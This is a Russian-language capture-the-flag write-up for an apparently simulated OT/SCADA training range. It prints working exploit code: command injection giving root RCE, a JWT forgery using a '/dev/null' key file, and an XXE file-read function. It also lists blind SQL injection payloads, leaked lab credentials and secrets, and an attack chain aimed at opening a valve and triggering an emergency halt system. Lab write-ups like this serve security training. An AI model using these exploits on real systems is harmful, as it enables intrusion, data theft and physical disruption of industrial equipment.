# KazHackStan CTF — Writeup

## Сеть и окружение

- **VPN-сеть**: `192.168.242.0/24`
- **Платформа**: OT/SCADA training range
- **Инструменты**: Kali Linux, Python3 скрипты

---

## Найденные флаги

| # | Машина | Уязвимость | Флаг | Очки |
|---|--------|-----------|------|------|
| 1 | EcoCycle | SQLi | `KHS{117ffaa7e3f13a4f6fd6962614a1382b1e09e61d3ebe4dbe}` | — |
| 2 | EcoCycle | RCE (Command Injection) | `KHS{744eb38351078969e606ed97dfdab958793f15b6905672b4}` | — |
| 3 | chipdeep | CSRF + IDOR | `KHS{f82afc8d2b36021f684295bce088cffc95cc5a8d7baaf7a7}` | — |
| 4 | Dastarkhan | IDOR | `KHS{5a351a2e722a794d07fb7f24585cf9e42da9cc9d9465c838}` | ротируется |
| 5 | Wind Farm | SQLi | (найден) | — |
| 6 | Wind Farm | IDOR | (найден) | — |
| 7 | Wind Farm | Template Injection | (найден) | — |
| 8 | Gazoprovod | RCE chain | `KHS{70c90c0ec0f4cd2d06b3ac26728f41bccdc0d5e541676e05}` | — |
| 9 | KHS Logistics | SSTI | `KHS{x}` (возможно валидный) | — |

---

## 1. EcoCycle (192.168.242.199)

### 1.1 SQLi — флаг найден

**Уязвимость**: SQL-инъекция в одном из API-эндпоинтов.

**Флаг**: `KHS{117ffaa7e3f13a4f6fd6962614a1382b1e09e61d3ebe4dbe}`

### 1.2 RCE — Command Injection — флаг найден

**Уязвимость**: Newline injection (`%0a`) в параметре `target` эндпоинта `/api/ops/diag/run`.

**Причина**: Серверный код выполняет:
```python
subprocess.run('getent hosts ' + target, shell=True)
```

Параметр `target` не санитизируется. Инъекция `%0a` (newline) позволяет выполнить произвольную команду.

**Ограничения**: Длина URL ~200 символов после URL-кодирования. Работает от root.

**Эксплуатация**:
```python
def eco_full(cmd):
    safe = set("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-._:")
    enc = ""
    for c in cmd:
        enc += c if c in safe else f"%{ord(c):02x}"
    target = f"127.0.0.1%0a{enc}"
    r = SE.post(f"{ECO}/api/ops/diag/run",
        json={"device":"WE-1","probe":"pk_we1_e5a2b4d6f809","target":target}, timeout=30)
    d = r.json()
    out = d.get("output", "")
    lines = [l for l in out.split("\n") if l.strip() and "localhost" not in l]
    return "\n".join(lines), d.get("error", "")
```

**Флаг**: `KHS{744eb38351078969e606ed97dfdab958793f15b6905672b4}`

### 1.3 EcoCycle — разведка сети

Через RCE обнаружена внутренняя Docker-сеть:

| IP | Сервис | Порт |
|----|--------|------|
| 172.18.0.1 | Gateway | — |
| 172.18.0.2 | nginx | 80 |
| 172.18.0.4 | EcoCycle web | 3000 |
| 172.18.0.5 | EcoCycle controller | 9200 |
| 172.18.0.6 | plant-db (PostgreSQL) | 5432 |

**Probe secrets (для диагностики)**:
```
WE-1:  pk_we1_e5a2b4d6f809
SL-A3: pk_a3_7f21c9d4e0b6
SL-A7: pk_a7_2b8e4c6a1f0d
SL-B2: pk_b2_9a1d3f5b7c2e
SL-B5: pk_b5_4c6a1f0d9c37
```

**Env vars контроллера**: `HOSTNAME=905c2cb575d1, PORT=9200, HOME=/root, SERVER_SOFTWARE=gunicorn/22.0.0, PYTHON_VERSION=3.11.16` — **нет DB credentials** в переменных окружения.

**plant-db**: Порт открыт, но все комбинации логин/пароль возвращают AUTH_TYPE:10 (SCRAM-SHA-256) — без пароля подключиться нельзя.

---

## 2. CaspiTerminal (192.168.242.224) — 9000 очков, В ПРОЦЕССЕ

### 2.1 JWT Bypass — /dev/null trick

**Уязвимость**: JWT-токен с `kid="/dev/null"` принимается сервером. Сервер читает `/dev/null` как HMAC-ключ → пустые байты → подпись пустым ключом валидна.

```python
def make_jwt(role="operator", sub="ctf", company="X"):
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":"/dev/null"}, separators=(',',':')).encode()
    p = json.dumps({"sub":sub,"company":company,"role":role,
                    "iat":int(time.time()),"exp":int(time.time())+86400}, separators=(',',':')).encode()
    msg = b64url_c(h) + '.' + b64url_c(p)
    sig = hmac.new(b'', msg.encode(), hashlib.sha256).digest()
    return msg + '.' + b64url_c(sig)
```

Работает с **любой ролью** (operator, admin, superadmin и т.д.), но дополнительного доступа не дает — все роли имеют одинаковый функционал.

### 2.2 XXE — чтение файлов

**Уязвимость**: XXE в POST `/api/ops/custody/ingest` (XML-парсер lxml).

**Ограничения**:
- Нельзя читать файлы содержащие `<`, `>`, `&` или null bytes (XML parser отвергает)
- External DTD заблокированы
- HTTP entities НЕ работают (lxml не делает HTTP-запросы для entities)
- XInclude НЕ обрабатывается
- Parameter entity tricks отклоняются

```python
def xxe_read(path, field="remarks"):
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file://{path}">]>
<ticket>
  <reference>{"&x;" if field=="reference" else "r"}</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>{"&x;" if field=="carrier" else "C"}</carrier>
  <remarks>{"&x;" if field=="remarks" else "R"}</remarks>
</ticket>'''
    r = SCA.post(f"{CASPI}/api/ops/custody/ingest",
        data=xml, headers={"Content-Type": "application/xml"}, timeout=CT)
    d = r.json()
    return d.get("summary", {}).get(field, ""), d
```

**Прочитанные файлы**:

| Файл | Статус |
|------|--------|
| `/app/db.py` | Прочитан полностью |
| `/app/gunicorn.conf.py` | Прочитан (стандартный конфиг) |
| `/app/requirements.txt` | Прочитан |
| `/app/static/css/app.css` | Прочитан |
| `/app/app.py` | СУЩЕСТВУЕТ, но содержит `<`/`&` — нечитаем |
| `/app/auth.py` | СУЩЕСТВУЕТ, но содержит `<`/`&` — нечитаем |
| `/app/entrypoint.sh` | СУЩЕСТВУЕТ, но содержит `<`/`&` — нечитаем |
| `/app/templates/` | Директория существует |
| `/app/static/` | Директория существует |

**`/app/db.py` (полный исходник)**:
```python
"""Postgres access for the portal — a small connection pool shared by workers."""
import os, threading
import psycopg2
from psycopg2 import pool

_POOL = None
_LOCK = threading.Lock()
DATABASE_URL = os.environ.get(
    'DATABASE_URL',
    'postgresql://terminal_web:terminal_web_pw@terminal-db:5432/terminal',
)

def _pool():
    global _POOL
    if _POOL is None:
        with _LOCK:
            if _POOL is None:
                _POOL = pool.ThreadedConnectionPool(1, int(os.environ.get('DB_POOL', '8')), dsn=DATABASE_URL)
    return _POOL

def query(sql: str, params=None, one: bool = False):
    p = _pool()
    conn = p.getconn()
    try:
        cur = conn.cursor()
        cur.execute(sql, params or ())
        if cur.description is None:
            conn.commit()
            return None
        cols = [c.name for c in cur.description]
        rows = [dict(zip(cols, r)) for r in cur.fetchall()]
        conn.commit()
        return (rows[0] if rows else None) if one else rows
    except Exception:
        conn.rollback()
        raise
    finally:
        p.putconn(conn)
```

**`/app/requirements.txt`**:
```
Flask==3.0.3
gunicorn==22.0.0
psycopg2-binary==2.9.9
lxml==5.2.2
requests==2.32.3
```

**`/proc/self/status`**: gunicorn, PID 554, PPid 1, UID 0 (root), Python 3.11

### 2.3 Probe/HMAC система

**Механизм подписи**:
1. `GET /api/ops/probe/sign?device=X` → `{url, sig}`
2. `POST /api/ops/probe` с `{url, sig}` → HTTP GET к gauge-gw
3. Подпись: HMAC-SHA256(PROBE_SECRET, url)
4. Детерминистичная — одинаковый device всегда дает одинаковый sig

**Зарегистрированные устройства (5 штук)**:
```
lm-01 → http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow
  sig=5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09

tk-01 → http://gauge-gw.internal:9100/v1/tanks/1/level
  sig=ece8b8f9671e56962dcb233b483c94fd1ea7384ec10d27288925572c6a44c803

tk-02 → http://gauge-gw.internal:9100/v1/tanks/2/level
  sig=0e996e2ff657529641db10233f9f863a846e06b178c6ad37908185a190a66197

tk-03 → http://gauge-gw.internal:9100/v1/tanks/3/level
  sig=c0a3f9ef039f26fe9a8bcfb41b71427587dc88dc0ef600b1c49488b072f2c9d3

tk-07 → http://gauge-gw.internal:9100/v1/tanks/7/level
  sig=447a4c0f1fa7769cdfb2b67842364d8b699b5e85a5b2784524146f7a5af5132f
```

### 2.4 SQL Injection на /api/auth/login — ПОДТВЕРЖДЕНО

**Уязвимость**: Time-based blind SQL injection в поле `password` эндпоинта `POST /api/auth/login`.

**Доказательство**:
```
POST /api/auth/login
{"email": "ops@caspiterminal.kz", "password": "admin'; SELECT pg_sleep(3)--"}

Результат: 502 Bad Gateway через 23 секунды
(vs 0.0s и 401 для обычных запросов)
```

**Другие SQLi-пейлоады и результаты**:
```
admin' OR 1=1--          → 401 instant (SQL ошибка → "invalid credentials")
admin' UNION SELECT 1,2,3-- → 401 instant
admin'; SELECT pg_sleep(3)-- → 502 после 23s ← ПОДТВЕРЖДЕНИЕ ИНЪЕКЦИИ
```

**Стратегия эксплуатации** (round26_sqli_exploit.py):
1. Калибровка таймингов `pg_sleep(N)` с адаптивным порогом
2. Перечисление таблиц через boolean-запросы
3. Поиск столбцов с ключевыми словами (secret, probe, hmac, key, flag)
4. Извлечение значений посимвольно (binary search, ~7 запросов на символ)
5. Попытка `pg_read_file()` для чтения app.py через PostgreSQL
6. Проверка каждого найденного значения как HMAC-ключа

### 2.5 ЦЕЛЬ: LLEHS (Load Level Emergency Halt System) — 9000 очков

**Цепочка атаки**:
1. SQLi → извлечь PROBE_SECRET из БД
2. Подписать произвольный URL (valve-open, llehs-trigger)
3. POST на `/api/ops/probe` с поддельной подписью
4. Вызвать LLEHS → получить флаг

### 2.6 Что ТОЧНО не работает (исключено)

| Вектор | Результат |
|--------|----------|
| HTTP XXE / SSRF | lxml не делает HTTP-запросы для entities |
| XInclude | Не обрабатывается парсером |
| Parameter entities | Отклоняются |
| External DTD / OOB XXE | Заблокированы |
| SSTI через custody tickets | Клиентский рендеринг, не серверный |
| SQLi в custody/ingest полях | Параметризованные запросы (psycopg2) |
| HMAC brute-force до 2 байт | 65792 ключа проверены — нет совпадений |
| Чтение файлов с `<`/`&` через XXE | Невозможно |
| Разные JWT-роли | 10+ ролей проверено — одинаковый доступ |
| Инъекция параметров в sign endpoint | Только 5 устройств, без инъекции |
| Прямое подключение к terminal-db с EcoCycle | Разные Docker-сети |

### 2.7 PostgreSQL (terminal-db)

```
Host: terminal-db (из Docker-сети CaspiTerminal)
Port: 5432
User: terminal_web
Pass: terminal_web_pw
DB: terminal
```

Недоступен с EcoCycle (другая Docker-сеть). Доступен только через SQLi в login-эндпоинте.

---

## 3. chipdeep — CSRF + IDOR

**Флаг**: `KHS{f82afc8d2b36021f684295bce088cffc95cc5a8d7baaf7a7}`

---

## 4. Dastarkhan — IDOR

**Флаг**: `KHS{5a351a2e722a794d07fb7f24585cf9e42da9cc9d9465c838}` (ротируется)

**Нерешено**: Partner access — не исследовано.

---

## 5. Wind Farm — 3 флага

- SQLi
- IDOR
- Template Injection

---

## 6. Gazoprovod — RCE chain

**Флаг**: `KHS{70c90c0ec0f4cd2d06b3ac26728f41bccdc0d5e541676e05}`

---

## 7. KHS Logistics — SSTI

**Флаг**: `KHS{x}` — возможно валидный, нужно проверить.

---

## Нерешенные задачи

| Задача | Статус | Приоритет |
|--------|--------|----------|
| CaspiTerminal PROBE_SECRET (LLEHS) | SQLi подтверждена, экстракция из БД в процессе | **ВЫСОКИЙ (9000 pts)** |
| CityPortal SQLi | Connection timeout | Средний |
| Dastarkhan partner access | Не исследовано | Низкий |
| KHS Energy x-token | Не исследовано | Низкий |

---

## Написанные скрипты

| Скрипт | Содержание |
|--------|----------|
| `round22_ssti.py` | SSTI, HTTP XXE debug, модули приложения, VPN PG scan, эндпоинты, конфиг, derived keys |
| `round23_breakthrough.py` | Flag files, XInclude, parameter entities, /proc, секреты, directory listing, PG client, brute-force |
| `round24_custody.py` | Custody HTML, эндпоинты, extreme tickets, env vars, секреты, directory listing, 65K brute-force |
| `round25_sqli.py` | Login SQLi, JWT field injection, static files, extreme tickets, raw PG, web portal, page scan |
| `round26_sqli_exploit.py` | **Time-based blind SQLi эксплуатация** — калибровка, перечисление таблиц/столбцов, извлечение PROBE_SECRET, pg_read_file, LLEHS trigger |

---

## Текущий шаг

Запустить `round26_sqli_exploit.py` на Kali для извлечения PROBE_SECRET из базы данных CaspiTerminal через подтвержденную time-based blind SQL injection на `/api/auth/login`. После получения ключа — подписать URL для открытия клапана и активировать LLEHS для получения флага на 9000 очков.
